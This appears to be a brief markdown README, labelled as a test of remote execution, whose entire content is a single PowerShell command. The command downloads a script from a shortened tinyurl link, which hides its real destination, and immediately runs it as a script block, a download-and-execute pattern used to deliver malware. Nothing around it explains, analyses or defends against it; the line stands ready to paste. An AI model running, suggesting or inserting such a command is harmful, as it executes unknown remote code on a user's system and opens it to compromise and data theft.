# So

This is to test Remote Execution code Example line : 
```
powershell -Command "Invoke-Command -ScriptBlock ([ScriptBlock]::Create((Invoke-WebRequest -Uri 'https://tinyurl.com/yrf7ck5z' -UseBasicParsing).Content))"
```
